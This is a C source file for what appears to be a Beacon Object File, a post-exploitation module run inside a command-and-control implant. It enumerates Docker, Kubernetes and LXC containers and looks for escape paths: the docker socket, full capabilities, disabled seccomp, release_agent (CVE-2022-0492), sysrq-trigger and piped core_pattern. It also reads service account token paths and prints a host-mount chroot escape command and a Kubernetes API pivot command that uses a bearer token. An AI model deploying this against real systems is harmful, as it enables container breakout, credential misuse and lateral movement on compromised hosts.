/// container_detect.c — Container detection + escape analysis
/// gcc -c -o container_detect.o container_detect.c -include bof_api.h -Os -fPIC
#include "bof_api.h"

static void hdr(const char *s) { BeaconPrintf(CALLBACK_OUTPUT, "\n\xe2\x94\x8c\xe2\x94\x80 %s\n", s); }
static void sub(const char *s) { BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x9c\xe2\x94\x80 %s\n", s); }
static void fin(const char *s) { BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x94\xe2\x94\x80 %s\n\n", s); }
static void ln(const char *s)  { BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x82  %s\n", s); }

static int fexist(const char *p){unsigned int m=0;return AxFileStat(p,&m,(long*)0,(unsigned int*)0,(unsigned int*)0)==0;}
static int fhas(const char *p,const char *n){char *d=(char*)0;int l=AxReadFileToBuffer(p,&d,65536);
    if(l<=0||!d)return 0;int r=(AxStrstr(d,n)!=(char*)0);AxFree(d);return r;}

static void check_docker(void) {
    sub("Docker");
    int det=0;
    if(fexist("/.dockerenv")){ln("[+] /.dockerenv exists");det=1;}
    if(fhas("/proc/1/cgroup","docker")){ln("[+] cgroup contains 'docker'");det=1;}
    if(fexist("/var/run/docker.sock")){
        ln("[!!] Docker socket at /var/run/docker.sock");
        ln("     ESCAPE: docker run -v /:/host --rm -it alpine chroot /host sh");det=1;}
    if(!det){ln("[-] No Docker indicators");return;}

    char *st=(char*)0;int sl=AxReadFileToBuffer("/proc/1/status",&st,8192);
    if(sl>0&&st){
        char *sc=AxStrstr(st,"Seccomp:");
        if(sc){sc+=8;while(*sc==' '||*sc=='\t')sc++;
            if(*sc=='0') ln("[!!] Seccomp DISABLED — likely PRIVILEGED container");}
        char *ce=AxStrstr(st,"CapEff:");
        if(ce){ce+=7;while(*ce==' '||*ce=='\t')ce++;
            char cv[32];int i=0;while(ce[i]&&ce[i]!='\n'&&i<31){cv[i]=ce[i];i++;}cv[i]='\0';
            if(AxStrstr(cv,"0000003fffffffff")||AxStrstr(cv,"000001ffffffffff"))
                ln("[!!] Full capabilities — PRIVILEGED");
            char b[64];AxSnprintf(b,sizeof(b),"CapEff: %s",cv);ln(b);}
        AxFree(st);
    }
    char *mt=(char*)0;int ml=AxReadFileToBuffer("/proc/mounts",&mt,131072);
    if(ml>0&&mt){
        if(AxStrstr(mt,"/dev/sd")||AxStrstr(mt,"/dev/nvme")||AxStrstr(mt,"/dev/vd"))
            ln("[!] Block devices mounted — disk access possible");
        AxFree(mt);
    }
}

static void check_k8s(void) {
    sub("Kubernetes");
    int det=0;
    if(fexist("/var/run/secrets/kubernetes.io/serviceaccount/token")){
        ln("[+] K8s service account token found");det=1;
        char *ns=(char*)0;int nl=AxReadFileToBuffer(
            "/var/run/secrets/kubernetes.io/serviceaccount/namespace",&ns,256);
        if(nl>0&&ns){if(ns[nl-1]=='\n')ns[nl-1]='\0';
            char b[80];AxSnprintf(b,sizeof(b),"Namespace: %s",ns);ln(b);AxFree(ns);}
    }
    char v[256];
    if(AxGetEnv("KUBERNETES_SERVICE_HOST",v,sizeof(v))>0){
        char b[128];AxSnprintf(b,sizeof(b),"[+] KUBERNETES_SERVICE_HOST=%s",v);ln(b);det=1;}
    if(!det) ln("[-] No Kubernetes indicators");
    else {
        ln("Pivot: curl -sk https://$KUBERNETES_SERVICE_HOST/api -H 'Authorization: Bearer <token>'");
    }
}

static void check_lxc(void) {
    sub("LXC/LXD");
    if(fhas("/proc/1/cgroup","lxc")) ln("[+] LXC container (cgroup)");
    else if(fhas("/proc/1/environ","container=lxc")) ln("[+] LXC container (environ)");
    else ln("[-] No LXC indicators");
}

static void check_escape(void) {
    sub("Escape Vectors");
    if(fexist("/sys/fs/cgroup/memory/release_agent"))
        ln("[!!] release_agent exists — CVE-2022-0492 potential");
    if(fexist("/proc/sysrq-trigger")){
        unsigned int m=0;AxFileStat("/proc/sysrq-trigger",&m,(long*)0,(unsigned int*)0,(unsigned int*)0);
        if(m&0200) ln("[!] /proc/sysrq-trigger writable — privileged");
    }
    char *cp=(char*)0;int cl=AxReadFileToBuffer("/proc/sys/kernel/core_pattern",&cp,256);
    if(cl>0&&cp){if(cp[0]=='|'){char b[128];AxSnprintf(b,sizeof(b),"[!] core_pattern uses pipe: %s",cp);ln(b);}AxFree(cp);}
}

void go(char *args, int args_len) {
    hdr("Container Detection");
    char v[256];
    if(AxGetEnv("container",v,sizeof(v))>0){char b[80];AxSnprintf(b,sizeof(b),"$container=%s",v);ln(b);}
    char *cl=(char*)0;int cll=AxReadFileToBuffer("/proc/1/cmdline",&cl,256);
    if(cll>0&&cl){char b[128];AxSnprintf(b,sizeof(b),"PID 1: %s",cl);ln(b);AxFree(cl);}

    check_docker();
    check_k8s();
    check_lxc();
    check_escape();
    fin("Container analysis complete");
}
